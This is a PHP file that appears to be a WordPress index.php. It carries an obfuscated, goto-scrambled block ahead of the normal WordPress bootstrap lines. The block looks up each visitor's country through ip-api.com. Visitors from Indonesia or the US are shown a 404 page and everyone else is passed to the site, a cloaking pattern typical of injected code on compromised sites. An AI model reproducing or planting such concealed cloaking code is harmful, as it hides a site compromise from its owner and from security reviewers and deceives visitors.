<?php
goto qDH6j; CPD1l: $ip = getUserIP(); goto jeu7j; jeu7j: $api_url = "http://ip-api.com/json/{$ip}"; goto hg3Lx; lGjNf: if ($data["countryCode"] === "ID" || $data["countryCode"] === "US") { ob_start(); include "404.html"; $output = ob_get_clean(); echo $output; die; } goto SGv1B; hg3Lx: $response = file_get_contents($api_url); goto fs84q; qDH6j: function getUserIP() { if (!empty($_SERVER["HTTP_CLIENT_IP"])) { $ip = $_SERVER["HTTP_CLIENT_IP"]; } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) { $ip = explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0]; } else { $ip = $_SERVER["REMOTE_ADDR"]; } return $ip; } goto CPD1l; fs84q: $data = json_decode($response, true); goto lGjNf; SGv1B:
define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';
